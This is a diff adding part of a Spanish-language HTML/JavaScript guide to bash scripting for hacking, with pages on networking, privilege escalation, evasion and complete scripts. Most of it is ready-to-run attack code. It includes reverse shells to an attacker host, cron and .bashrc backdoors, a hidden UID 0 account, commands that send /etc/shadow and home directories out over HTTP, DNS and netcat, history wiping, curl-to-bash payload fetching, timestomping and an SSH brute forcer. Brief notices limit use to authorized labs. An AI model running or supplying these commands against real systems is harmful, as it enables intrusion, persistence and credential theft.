+                id: 'networking', label: 'Networking', badge: 'amber', badgeText: 'intermedio', desc: 'Scripts de reconocimiento, port scanning y reverse shells.', sections: [
+                    {
+                        title: 'Port scanner en bash puro', html: `
+<div class="codeblock"><span class="label">portscan.sh</span><pre><span class="comment">#!/bin/bash
+# Port scanner sin nmap usando /dev/tcp</span>
+
+<span class="var">TARGET</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>
+<span class="var">START</span>=<span class="str">"</span><span class="var">\${2:-1}</span><span class="str">"</span>
+<span class="var">END</span>=<span class="str">"</span><span class="var">\${3:-1024}</span><span class="str">"</span>
+
+<span class="func">scan_port</span>() {
+<span class="kw">local</span> <span class="var">port</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>
+(<span class="cmd">echo</span> &gt; /dev/tcp/<span class="var">$TARGET</span>/<span class="var">$port</span>) &amp;&gt; /dev/null
+<span class="kw">if</span> [ <span class="var">$?</span> <span class="flag">-eq</span> <span class="num">0</span> ]; <span class="kw">then</span>
+<span class="func">log_ok</span> <span class="str">"Puerto </span><span class="var">$port</span><span class="str"> abierto"</span>
+<span class="kw">fi</span>
+}
+
+<span class="cmd">echo</span> <span class="str">"[*] Escaneando </span><span class="var">$TARGET</span><span class="str">:</span><span class="var">$START</span><span class="str">-</span><span class="var">$END</span><span class="str">"</span>
+<span class="kw">for</span> <span class="var">port</span> <span class="kw">in</span> $(<span class="cmd">seq</span> <span class="var">$START</span> <span class="var">$END</span>); <span class="kw">do</span>
+<span class="func">scan_port</span> <span class="var">$port</span> &amp; <span class="comment"># paralelo</span>
+[ $(( <span class="var">port</span> % <span class="num">100</span>)) <span class="flag"> -eq</span> <span class="num">0</span>] &amp;&amp; <span class="cmd">wait</span>
+<span class="kw">done</span>
+<span class="cmd">wait</span></pre></div>
+            <div class="warn"><strong>Nota:</strong> /dev/tcp es una feature de bash, no disponible en sh o dash. Funciona sin herramientas externas — útil cuando nmap no está instalado.</div>
+        `},{title:'Reverse shells',html:`
+            <div class="codeblock"> <pre><span class="comment">## ── BASH REVERSE SHELL ──────────────────────────────
+# En el atacante: nc -lvnp 4444
+# En la víctima (ejecutar esto):</span>
+<span class="cmd">bash</span> <span class="flag">-i</span> &gt;&amp; /dev/tcp/<span class="var">LHOST</span>/<span class="num">4444</span> 0&gt;&amp;1
+
+<span class="comment">## ── CON /dev/tcp (más silencioso) ───────────────────</span>
+<span class="kw">exec</span> <span class="num">5</span>&lt;&gt;/dev/tcp/<span class="var">LHOST</span>/<span class="num">4444</span>
+<span class="cmd">cat</span> &lt;&amp;5 | <span class="kw">while</span> <span class="kw">read</span> <span class="var">line</span>; <span class="kw">do</span> <span class="var">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="kw">done</span>
+
+<span class="comment">## ── NETCAT REVERSE SHELL ────────────────────────────</span>
+<span class="cmd">nc</span> <span class="flag">-e</span> /bin/bash <span class="var">LHOST</span> <span class="num">4444</span>
+<span class="comment"># Si -e no está disponible (nc tradicional):</span>
+<span class="cmd">rm</span> /tmp/f; <span class="cmd">mkfifo</span> /tmp/f
+<span class="cmd">cat</span> /tmp/f | /bin/bash <span class="flag">-i</span> 2&gt;&amp;1 | <span class="cmd">nc</span> <span class="var">LHOST</span> <span class="num">4444</span> &gt; /tmp/f
+
+<span class="comment">## ── UPGRADE A TTY COMPLETO ──────────────────────────
+# Tras recibir la shell:</span>
+python3 <span class="flag">-c</span> <span class="str">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="comment"># Ctrl+Z, luego:</span>
+<span class="cmd">stty</span> raw <span class="flag">-echo</span>; <span class="cmd">fg</span>
+<span class="cmd">export</span> <span class="var">TERM</span>=xterm</pre></div>
+                    <div class="danger"><strong>Solo para entornos autorizados.</strong> Usar reverse shells sin permiso explícito es ilegal. Practica en laboratorios como HackTheBox, TryHackMe o tu propio entorno.</div>
+        `},{title:'Automatizar wget/curl para reconocimiento web',html:`
+            <div class="codeblock"> <pre><span class="comment"># Verificar tecnologías web</span>
+<span class="func">web_recon</span>() {
+<span class="kw">local</span> <span class="var">url</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>
+<span class="cmd">echo</span> <span class="str">"[*] Headers de </span><span class="var">$url</span><span class="str">"</span>
+<span class="cmd">curl</span> <span class="flag">-sI</span> <span class="var">$url</span> | <span class="cmd">grep</span> <span class="flag">-iE</span> <span class="str">"(server|x-powered|content-type)"</span>
+
+<span class="cmd">echo</span> <span class="str">"[*] Buscando robots.txt"</span>
+<span class="cmd">curl</span> <span class="flag">-sf</span> <span class="str">"</span><span class="var">$url</span><span class="str">/robots.txt"</span> &amp;&amp; <span class="cmd">echo</span> <span class="ok">"[+] robots.txt encontrado"</span>
+
+<span class="cmd">echo</span> <span class="str">"[*] Buscando .git expuesto"</span>
+<span class="cmd">curl</span> <span class="flag">-sf</span> <span class="str">"</span><span class="var">$url</span><span class="str">/.git/HEAD"</span> &amp;&amp; <span class="cmd">echo</span> <span class="err">"[!] .git expuesto!"</span>
+}
+
+<span class="comment"># Directory brute force con bash</span>
+<span class="kw">while</span> <span class="kw">read</span> <span class="var">dir</span>; <span class="kw">do</span>
+<span class="var">CODE</span>=<span class="func">$(</span><span class="cmd">curl</span> <span class="flag">-so</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> <span class="str">"</span><span class="var">$URL</span><span class="str">/</span><span class="var">$dir</span><span class="str">"</span><span class="func">)</span>
+[ <span class="str">"</span><span class="var">$CODE</span><span class="str">"</span> != <span class="str">"404"</span> ] &amp;&amp; <span class="cmd">echo</span> <span class="str">"[</span><span class="var">$CODE</span><span class="str">] /</span><span class="var">$dir</span><span class="str">"</span>
+<span class="kw">done</span> &lt; /usr/share/wordlists/dirb/common.txt</pre></div>
+                    `}]},
+
+{id:'privesc',label:'Privesc & Post-explotación',badge:'red',badgeText:'avanzado',desc:'Scripts para escalada de privilegios y persistencia tras comprometer un sistema.',sections:[
+{title:'Enumeración automática de privesc',html:`
+                    <div class="codeblock"><span class="label">enum.sh</span><pre><span class="comment">#!/bin/bash
+# Enumeración rápida para escalada de privilegios</span>
+
+<span class="func">check_section</span>() { <span class="cmd">echo</span> <span class="str">"\n═══ </span><span class="var">$1</span><span class="str"> ═══"</span>; }
+
+<span class="func">check_section</span> <span class="str">"Sistema"</span>
+<span class="cmd">uname</span> <span class="flag">-a</span>; <span class="cmd">cat</span> /etc/issue 2&gt;/dev/null
+
+<span class="func">check_section</span> <span class="str">"Usuario actual"</span>
+<span class="cmd">id</span>; <span class="cmd">sudo</span> <span class="flag">-l</span> 2&gt;/dev/null
+
+<span class="func">check_section</span> <span class="str">"SUID binarios"</span>
+<span class="cmd">find</span> / <span class="flag">-perm</span> <span class="flag">-4000</span> <span class="flag">-type</span> f 2&gt;/dev/null | <span class="cmd">xargs</span> <span class="cmd">ls</span> <span class="flag">-la</span>
+
+<span class="func">check_section</span> <span class="str">"Cron jobs"</span>
+<span class="cmd">cat</span> /etc/crontab 2&gt;/dev/null
+<span class="cmd">ls</span> <span class="flag">-la</span> /etc/cron.* 2&gt;/dev/null
+
+<span class="func">check_section</span> <span class="str">"Passwords en archivos"</span>
+<span class="cmd">grep</span> <span class="flag">-rns</span> <span class="flag">--include</span>=<span class="str">"*.php"</span> <span class="str">"password"</span> /var/www/ 2&gt;/dev/null
+<span class="cmd">find</span> /home <span class="flag">-name</span> <span class="str">"*.txt"</span> <span class="flag">-o</span> <span class="flag">-name</span> <span class="str">"*.conf"</span> 2&gt;/dev/null
+
+<span class="func">check_section</span> <span class="str">"Capabilities"</span>
+<span class="cmd">getcap</span> <span class="flag">-r</span> / 2&gt;/dev/null
+
+<span class="func">check_section</span> <span class="str">"Writable en PATH"</span>
+<span class="kw">for</span> <span class="var">dir</span> <span class="kw">in</span> $(<span class="cmd">echo</span> <span class="var">$PATH</span> | <span class="cmd">tr</span> <span class="str">':'</span> <span class="str">' '</span>); <span class="kw">do</span>
+[ <span class="flag">-w</span> <span class="str">"</span><span class="var">$dir</span><span class="str">"</span> ] &amp;&amp; <span class="cmd">echo</span> <span class="str">"[!] Writable: </span><span class="var">$dir</span><span class="str">"</span>
+<span class="kw">done</span></pre></div>
+            `},{title:'Persistencia',html:`
+            <div class="codeblock"> <pre><span class="comment">## ── CRON BACKDOOR ───────────────────────────────────
+# Reverse shell cada minuto vía cron</span>
+(<span class="cmd">crontab</span> <span class="flag">-l</span> 2&gt;/dev/null; \
+<span class="cmd">echo</span> <span class="str">"* * * * * bash -i &gt;&amp; /dev/tcp/LHOST/4444 0&gt;&amp;1"</span>) \
+| <span class="cmd">crontab</span> <span class="flag">-</span>
+
+<span class="comment">## ── SSH AUTHORIZED_KEYS ──────────────────────────────
+# Agregar nuestra clave pública</span>
+<span class="cmd">mkdir</span> <span class="flag">-p</span> ~/.ssh
+<span class="cmd">echo</span> <span class="str">"ssh-rsa AAAA...tu_pubkey..."</span> &gt;&gt; ~/.ssh/authorized_keys
+<span class="cmd">chmod</span> <span class="num">600</span> ~/.ssh/authorized_keys
+
+<span class="comment">## ── USUARIO OCULTO ───────────────────────────────────</span>
+<span class="cmd">useradd</span> <span class="flag">-ou</span> <span class="num">0</span> <span class="flag">-g</span> <span class="num">0</span> <span class="flag">-s</span> /bin/bash <span class="flag">-M</span> sysadm
+<span class="cmd">echo</span> <span class="str">'sysadm:P@ssw0rd!'</span> | <span class="cmd">chpasswd</span>
+<span class="comment"># UID 0 = root en otro nombre</span>
+
+<span class="comment">## ── .BASHRC BACKDOOR ─────────────────────────────────</span>
+<span class="cmd">echo</span> <span class="str">'bash -i &gt;&amp; /dev/tcp/LHOST/4444 0&gt;&amp;1 &amp;'</span> &gt;&gt; ~/.bashrc</pre></div>
+                    <div class="danger"><strong>Ético y legal:</strong> Estas técnicas existen para que los defensores las conozcan y detecten. Aplícalas únicamente en sistemas propios o con autorización escrita explícita.</div>
+        `},{title:'Exfiltración de datos',html:`
+            <div class="codeblock"> <pre><span class="comment"># Exfiltrar via HTTP (servidor atacante: python3 -m http.server)</span>
+<span class="cmd">curl</span> <span class="flag">-F</span> <span class="str">"data=@/etc/shadow"</span> http://<span class="var">$LHOST</span>:8000/upload
+
+<span class="comment"># Exfiltrar vía DNS (más sigiloso)</span>
+<span class="var">DATA</span>=<span class="func">$(</span><span class="cmd">cat</span> /etc/passwd | <span class="cmd">base64</span> <span class="flag">-w0</span><span class="func">)</span>
+<span class="cmd">nslookup</span> <span class="str">"</span><span class="var">$DATA</span><span class="str">.</span><span class="var">$LHOST</span><span class="str">"</span>
+
+<span class="comment"># Comprimir y cifrar antes de exfiltrar</span>
+<span class="cmd">tar</span> <span class="flag">czf</span> - /home/ | \
+<span class="cmd">openssl</span> enc <span class="flag">-aes-256-cbc</span> <span class="flag">-k</span> <span class="str">"s3cr3t"</span> | \
+<span class="cmd">curl</span> <span class="flag">-sT</span> - http://<span class="var">$LHOST</span>:8000/data.enc
+
+<span class="comment"># Enviar via netcat</span>
+<span class="cmd">cat</span> /etc/shadow | <span class="cmd">nc</span> <span class="var">$LHOST</span> <span class="num">9001</span>
+<span class="comment"># Receptor: nc -lvnp 9001 > shadow.txt</span></pre></div>
+                    `}]},
+
+{id:'avanzado',label:'Bash avanzado',badge:'red',badgeText:'avanzado',desc:'Técnicas avanzadas: procesos, señales, sockets, IPC y evasión.',sections:[
+{title:'Procesos en background y señales',html:`
+                    <div class="codeblock"> <pre><span class="comment">#!/bin/bash
+# Control avanzado de procesos</span>
+
+<span class="comment"># Trap: ejecutar código al salir o recibir señal</span>
+<span class="func">cleanup</span>() {
+<span class="cmd">echo</span> <span class="str">"[*] Limpiando..."</span>
+<span class="cmd">rm</span> <span class="flag">-f</span> /tmp/.sess_ *
+<span class="cmd">kill</span> <span class="var">$LISTENER_PID</span> 2&gt;/dev/null
+}
+<span class="kw">trap</span> <span class="func">cleanup</span> EXIT INT TERM
+
+<span class="comment"># Job control — múltiples escaneos paralelos</span>
+<span class="var">PIDS</span>=()
+<span class="kw">for</span> <span class="var">host</span> <span class="kw">in</span> <span class="var">\${HOSTS[@]}</span>; <span class="kw">do</span>
+<span class="func">scan_host</span> <span class="str">"</span><span class="var">$host</span><span class="str">"</span> &amp;
+<span class="var">PIDS</span>+=(<span class="var">$!</span>)
+<span class="kw">done</span>
+
+<span class="comment"># Esperar con timeout de 30s</span>
+<span class="kw">for</span> <span class="var">pid</span> <span class="kw">in</span> <span class="var">\${PIDS[@]}</span>; <span class="kw">do</span>
+<span class="cmd">timeout</span> <span class="num">30</span> <span class="cmd">tail</span> <span class="flag">--pid</span>=<span class="var">$pid</span> <span class="flag">-f</span> /dev/null
+<span class="kw">done</span>
+
+<span class="comment"># Lock file para evitar ejecuciones dobles</span>
+<span class="var">LOCK</span>=<span class="str">"/tmp/.mylock"</span>
+[ <span class="flag">-f</span> <span class="var">$LOCK</span> ] &amp;&amp; { <span class="cmd">echo</span> <span class="str">"Ya en ejecución"</span>; <span class="kw">exit</span>; }
+<span class="cmd">touch</span> <span class="var">$LOCK</span>
+<span class="kw">trap</span> <span class="str">"rm -f </span><span class="var">$LOCK</span><span class="str">"</span> EXIT</pre></div>
+                            `},{title:'Evasión básica de detección',html:`
+                            <div class="codeblock"> <pre><span class="comment">#!/bin/bash
+# Técnicas de evasión comunes</span>
+
+<span class="comment">## Ofuscar comandos con variables</span>
+<span class="var">c</span>=<span class="str">"cat"</span>; <span class="var">f</span>=<span class="str">"/etc/passwd"</span>; <span class="var">$c</span> <span class="var">$f</span>
+
+<span class="comment">## Base64 para ocultar strings</span>
+<span class="var">CMD</span>=<span class="func">$(</span><span class="cmd">echo</span> <span class="str">"aWQ="</span> | <span class="cmd">base64</span> <span class="flag">-d</span><span class="func">)</span>   <span class="comment"># "id"</span>
+<span class="cmd">bash</span> <span class="flag">-c</span> <span class="str">"</span><span class="var">$CMD</span><span class="str">"</span>
+
+<span class="comment">## Redirigir stderr para limpiar output</span>
+<span class="cmd">command</span> 2&gt;/dev/null
+
+<span class="comment">## Eliminar historial</span>
+<span class="kw">unset</span> HISTFILE
+<span class="kw">export</span> <span class="var">HISTSIZE</span>=<span class="num">0</span>
+<span class="cmd">history</span> <span class="flag">-c</span>
+<span class="cmd">cat</span> /dev/null &gt; ~/.bash_history
+
+<span class="comment">## Ejecutar en memoria (sin tocar disco)</span>
+<span class="cmd">curl</span> <span class="flag">-s</span> http://<span class="var">$LHOST</span>/payload.sh | <span class="cmd">bash</span>
+
+<span class="comment">## Timestomp — cambiar fechas de archivos</span>
+<span class="cmd">touch</span> <span class="flag">-r</span> /bin/ls /tmp/backdoor.sh  <span class="comment"># mismo timestamp que /bin/ls</span></pre></div>
+                                    <div class="tip"><strong>Para defensores:</strong> Monitorear <code>HISTFILE=/dev/null</code>, ejecuciones via <code>curl | bash</code> y modificaciones de crontab son señales de alerta clave en SIEM/IDS.</div>
+        `},{title:'Sockets con /dev/tcp y /dev/udp',html:`
+            <div class="codeblock"> <pre><span class="comment">#!/bin/bash
+# Bash como cliente de red nativo</span>
+
+<span class="comment">## GET HTTP sin curl ni wget</span>
+<span class="kw">exec</span> <span class="num">3</span>&lt;&gt;/dev/tcp/example.com/80
+<span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n"</span> &gt;&amp;3
+<span class="cmd">cat</span> &lt;&amp;3
+<span class="kw">exec</span> <span class="num">3</span>&gt;&amp;-   <span class="comment"># cerrar fd</span>
+
+<span class="comment">## Banner grabbing manual</span>
+<span class="func">grab_banner</span>() {
+<span class="kw">exec</span> <span class="num">3</span> &lt;&gt;/dev/tcp/<span class="str">"</span><span class="var">$1</span><span class="str">"</span>/<span class="str">"</span><span class="var">$2</span><span class="str">"</span>
+<span class="cmd">read</span> <span class="flag">-t2</span> <span class="flag">-u3</span> <span class="var">BANNER</span>
+<span class="kw">exec</span> <span class="num">3</span>&gt;&amp;-
+<span class="cmd">echo</span> <span class="str">"Banner: </span><span class="var">$BANNER</span><span class="str">"</span>
+}
+
+<span class="func">grab_banner</span> <span class="str">"10.10.10.5"</span> <span class="num">22</span>   <span class="comment"># SSH banner</span>
+<span class="func">grab_banner</span> <span class="str">"10.10.10.5"</span> <span class="num">21</span>   <span class="comment"># FTP banner</span>
+<span class="func">grab_banner</span> <span class="str">"10.10.10.5"</span> <span class="num">25</span>   <span class="comment"># SMTP banner</span></pre></div>
+                    `}]},
+
+{id:'scripts',label:'Scripts completos',badge:'purple',badgeText:'proyectos',desc:'Scripts funcionales y completos: autorecon, brute forcer y listener.',sections:[
+{title:'AutoRecon — reconocimiento completo',html:`
+                    <div class="codeblock"><span class="label">autorecon.sh</span><pre><span class="comment">#!/bin/bash
+# AutoRecon — script de reconocimiento completo</span>
+
+<span class="func">log_ok</span>()   { <span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"\e[32m[+] </span><span class="var">$*</span><span class="str">\e[0m"</span>; }
+<span class="func">log_info</span>() { <span class="cmd">echo</span> <span class="flag">-e</span> <span class="str">"\e[34m[*] </span><span class="var">$*</span><span class="str">\e[0m"</span>; }
+
+<span class="var">TARGET</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>
+<span class="var">OUT</span>=<span class="str">"recon/</span><span class="var">$TARGET</span><span class="str">"</span>
+<span class="cmd">mkdir</span> <span class="flag">-p</span> <span class="var">$OUT</span>
+
+<span class="func">log_info</span> <span class="str">"Escaneando puertos (rápido)..."</span>
+<span class="cmd">nmap</span> <span class="flag">-T4</span> <span class="flag">--open</span> <span class="flag">-oG</span> <span class="var">$OUT</span>/quick.gnmap <span class="var">$TARGET</span> &amp;&gt;/dev/null
+
+<span class="var">PORTS</span>=<span class="func">$(</span><span class="cmd">grep</span> <span class="str">"open"</span> <span class="var">$OUT</span>/quick.gnmap | <span class="cmd">grep</span> <span class="flag">-oP</span> <span class="str">'\d+(?=/open)'</span> | <span class="cmd">paste</span> <span class="flag">-sd</span>,<span class="func">)</span>
+<span class="func">log_ok</span> <span class="str">"Puertos: </span><span class="var">$PORTS</span><span class="str">"</span>
+
+<span class="func">log_info</span> <span class="str">"Scan detallado de servicios..."</span>
+<span class="cmd">nmap</span> <span class="flag">-sC</span> <span class="flag">-sV</span> <span class="flag">-p</span> <span class="var">$PORTS</span> <span class="flag">-oA</span> <span class="var">$OUT</span>/full <span class="var">$TARGET</span>
+
+<span class="comment"># Web recon si hay HTTP</span>
+<span class="kw">if</span> <span class="cmd">echo</span> <span class="str">"</span><span class="var">$PORTS</span><span class="str">"</span> | <span class="cmd">grep</span> <span class="flag">-q</span> <span class="str">"80\|443\|8080"</span>; <span class="kw">then</span>
+<span class="func">log_info</span> <span class="str">"Enumerando web..."</span>
+<span class="cmd">gobuster</span> dir <span class="flag">-u</span> http://<span class="var">$TARGET</span> \
+<span class="flag">-w</span> /usr/share/wordlists/dirb/common.txt \
+<span class="flag">-o</span> <span class="var">$OUT</span>/dirs.txt <span class="flag">-q</span>
+<span class="kw">fi</span>
+
+<span class="func">log_ok</span> <span class="str">"Resultados en: </span><span class="var">$OUT</span><span class="str">/"</span></pre></div>
+            `},{title:'Brute Forcer SSH',html:`
+            <div class="codeblock"><span class="label">sshbrute.sh</span><pre><span class="comment">#!/bin/bash
+# SSH Brute Forcer con paralelismo controlado</span>
+
+<span class="var">TARGET</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>; <span class="var">USER</span>=<span class="str">"</span><span class="var">$2</span><span class="str">"</span>; <span class="var">WORDLIST</span>=<span class="str">"</span><span class="var">$3</span><span class="str">"</span>
+<span class="var">MAX_JOBS</span>=<span class="num">10</span>
+<span class="var">FOUND</span>=<span class="num">0</span>
+
+<span class="func">try_pass</span>() {
+[ <span class="var">$FOUND</span> <span class="flag">-eq</span> <span class="num">1</span> ] &amp;&amp; <span class="kw">return</span>
+<span class="kw">local</span> <span class="var">pass</span>=<span class="str">"</span><span class="var">$1</span><span class="str">"</span>
+<span class="kw">if</span> <span class="cmd">sshpass</span> <span class="flag">-p</span> <span class="str">"</span><span class="var">$pass</span><span class="str">"</span> <span class="cmd">ssh</span> <span class="flag">-o</span> StrictHostKeyChecking=no \
+<span class="flag">-o</span> ConnectTimeout=3 <span class="str">"</span><span class="var">$USER</span><span class="str">@</span><span class="var">$TARGET</span><span class="str">"</span> <span class="str">"id"</span> &amp;&gt;/dev/null; <span class="kw">then</span>
+<span class="var">FOUND</span>=<span class="num">1</span>
+<span class="cmd">echo</span> <span class="str">"[+] CREDENCIALES: </span><span class="var">$USER</span><span class="str">:</span><span class="var">$pass</span><span class="str">"</span>
+<span class="kw">fi</span>
+}
+
+<span class="var">JOBS</span>=<span class="num">0</span>
+<span class="kw">while</span> <span class="kw">read</span> <span class="flag">-r</span> <span class="var">PASS</span> &amp;&amp; [ <span class="var">$FOUND</span> <span class="flag">-eq</span> <span class="num">0</span> ]; <span class="kw">do</span>
+<span class="func">try_pass</span> <span class="str">"</span><span class="var">$PASS</span><span class="str">"</span> &amp;
+<span class="var">JOBS</span>=$(( <span class="var">JOBS</span> + <span class="num">1</span> ))
+[ <span class="var">$JOBS</span> <span class="flag">-ge</span> <span class="var">$MAX_JOBS</span> ] &amp;&amp; { <span class="cmd">wait</span>; <span class="var">JOBS</span>=<span class="num">0</span>; }
+<span class="kw">done</span> &lt; <span class="str">"</span><span class="var">$WORDLIST</span><span class="str">"</span>
+<span class="cmd">wait</span></pre></div>
+            `},{title:'Listener inteligente con logging',html:`
+            <div class="codeblock"><span class="label">listener.sh</span><pre><span class="comment">#!/bin/bash
+# Listener de reverse shells con logging y reconexión</span>
+
+<span class="var">PORT</span>=<span class="str">"</span><span class="var">\${1:-4444}</span><span class="str">"</span>
+<span class="var">LOG</span>=<span class="str">"sessions/session_</span><span class="func">$(</span><span class="cmd">date</span> <span class="str">+%Y%m%d_%H%M%S</span><span class="func">)</span><span class="str">.log"</span>
+<span class="cmd">mkdir</span> <span class="flag">-p</span> sessions
+
+<span class="cmd">echo</span> <span class="str">"[*] Escuchando en puerto </span><span class="var">$PORT</span><span class="str">..."</span>
+<span class="cmd">echo</span> <span class="str">"[*] Log: </span><span class="var">$LOG</span><span class="str">"</span>
+
+<span class="kw">while</span> <span class="kw">true</span>; <span class="kw">do</span>
+<span class="cmd">echo</span> <span class="str">"[*] Esperando conexión..."</span>
+<span class="cmd">nc</span> <span class="flag">-lvnp</span> <span class="var">$PORT</span> | <span class="cmd">tee</span> <span class="flag">-a</span> <span class="var">$LOG</span>
+<span class="cmd">echo</span> <span class="str">"[!] Sesión terminada — $(date)"</span> | <span class="cmd">tee</span> <span class="flag">-a</span> <span class="var">$LOG</span>
+<span class="cmd">sleep</span> <span class="num">1</span>   <span class="comment"># reconectar automáticamente</span>
+<span class="kw">done</span></pre></div>
+            `}]},
+
+{id:'tips',label:'Tips & referencias',badge:'blue',badgeText:'referencia',desc:'Atajos, one-liners, recursos y buenas prácticas.',sections:[
+{title:'One-liners esenciales para hacking',html:`
+            <table class="table"><thead><tr><th>One-liner</th><th class="desc">Descripción</th></tr></thead>
+<tbody>
+<tr><td>find / -perm -4000 2&gt;/dev/null</td><td class="desc">SUID binaries</td></tr>
+<tr><td>cat /proc/*/cmdline 2&gt;/dev/null</td><td class="desc">Procesos y sus argumentos</td></tr>
+<tr><td>ss -tlnp</td><td class="desc">Puertos en escucha (socket stats)</td></tr>
+<tr><td>ip route; arp -a</td><td class="desc">Routing y ARP cache</td></tr>
+<tr><td>env; printenv</td><td class="desc">Variables de entorno (tokens, keys)</td></tr>
+<tr><td>history | grep -i pass</td><td class="desc">Passwords en historial</td></tr>
+<tr><td>grep -r "password" /etc/ 2&gt;/dev/null</td><td class="desc">Passwords en configs</td></tr>
+<tr><td>last; lastlog</td><td class="desc">Últimos inicios de sesión</td></tr>
+<tr><td>netstat -antp 2&gt;/dev/null</td><td class="desc">Conexiones activas</td></tr>
+<tr><td>cat /etc/hosts</td><td class="desc">Hosts internos</td></tr>
+</tbody></table>
+            `},{title:'Recursos y laboratorios',html:`
+            <div class="cols2">
+<div class="card"><div class="card-title">HackTheBox</div><p>Máquinas reales con escalada de privilegios. Practica los scripts de esta guía en entornos controlados.</p></div>
+<div class="card"><div class="card-title">TryHackMe</div><p>Rutas de aprendizaje guiadas. Ideal para principiantes antes de pasar a HTB.</p></div>
+<div class="card"><div class="card-title">GTFOBins</div><p>gtfobins.github.io — referencia de binarios SUID/sudo para privesc en Linux.</p></div>
+<div class="card"><div class="card-title">PayloadsAllTheThings</div><p>github.com/swisskyrepo — colección de payloads, reverse shells y técnicas.</p></div>
+<div class="card"><div class="card-title">LinPEAS / WinPEAS</div><p>Scripts de enumeración automática mucho más completos que el ejemplo de esta guía.</p></div>
+<div class="card"><div class="card-title">Bash Hackers Wiki</div><p>wiki.bash-hackers.org — referencia completa de bash avanzado con ejemplos.</p></div>
+</div>
+            `},{title:'Buenas prácticas en bash scripting',html:`
+            <div class="codeblock"> <pre><span class="comment">#!/bin/bash
+# Cabecera recomendada para scripts profesionales</span>
+<span class="kw">set</span> <span class="flag">-e</span>          <span class="comment"># salir si algún comando falla</span>
+<span class="kw">set</span> <span class="flag">-u</span>          <span class="comment"># error si variable no definida</span>
+<span class="kw">set</span> <span class="flag">-o pipefail</span> <span class="comment"># fallo si cualquier parte del pipe falla</span>
+<span class="kw">set</span> <span class="flag">-o noclobber</span><span class="comment"># no sobreescribir archivos con &gt;</span>
+
+<span class="comment"># Siempre validar argumentos</span>
+[ <span class="var">$#</span> <span class="flag">-lt</span> <span class="num">1</span> ] &amp;&amp; {<span class="func">usage</span>; <span class="kw">exit</span> <span class="num">1</span>; }
+
+<span class="comment"># Usar comillas en variables con espacios</span>
+<span class="cmd">cp</span> <span class="str">"</span><span class="var">$SOURCE</span><span class="str">"</span> <span class="str">"</span><span class="var">$DEST</span><span class="str">"</span>     <span class="comment"># correcto</span>
+<span class="cmd">cp</span> <span class="var">$SOURCE</span> <span class="var">$DEST</span>         <span class="comment"># puede romperse con espacios</span>
+
+<span class="comment"># Usar mktemp para archivos temporales</span>
+<span class="var">TMP</span>=<span class="func">$(</span><span class="cmd">mktemp</span><span class="func">)</span>
+<span class="kw">trap</span> <span class="str">"rm -f </span><span class="var">$TMP</span><span class="str">"</span> EXIT
+
+<span class="comment"># Comprobar dependencias al inicio</span>
+<span class="kw">for</span> <span class="var">tool</span> <span class="kw">in</span> nmap curl nc sshpass; <span class="kw">do</span>
+<span class="cmd">command</span> <span class="flag">-v</span> <span class="var">$tool</span> &amp;&gt;/dev/null || { <span class="cmd">echo</span> <span class="str">"Falta: </span><span class="var">$tool</span><span class="str">"</span>; <span class="kw">exit</span> <span class="num">1</span>; }
+<span class="kw">done</span></pre></div>
+                    `}]}
+];
+
+let current=0;
+
+function render(){
+  const nav=document.getElementById('nav');
+  nav.innerHTML=pages.map((p,i)=>`
+    <div class="nav-item ${i===current?'active':''}" onclick="go(${i})">
+      <span class="num">${String(i+1).padStart(2,'0')}</span>
+      <span>${p.label}</span>
+    </div>
+  `).join('');
+
+  const c=document.getElementById('content');
+  const p=pages[current];
+  c.innerHTML=`
+    <div class="page active">
+      <div class="page-header">
+        <span class="badge ${p.badge}">${p.badgeText}</span>
+        <div class="page-title">${p.label}</div>
+        <div class="page-desc">${p.desc}</div>
+      </div>
+      ${p.sections.map(s=>`
+        <div class="section">
+          <div class="section-title">${s.title}</div>
+          ${s.html}
+        </div>
+      `).join('')}
+    </div>
+  `;
+  c.scrollTop=0;
+}
+
+function go(i){current=i;render();}
+
+document.getElementById('btn-prev').onclick=()=>{ if(current>0){current--;render();} };
+document.getElementById('btn-next').onclick=()=>{ if(current<pages.length-1){current++;render();} };
+
+render();
+    </script>
+</body>
+
+</html>
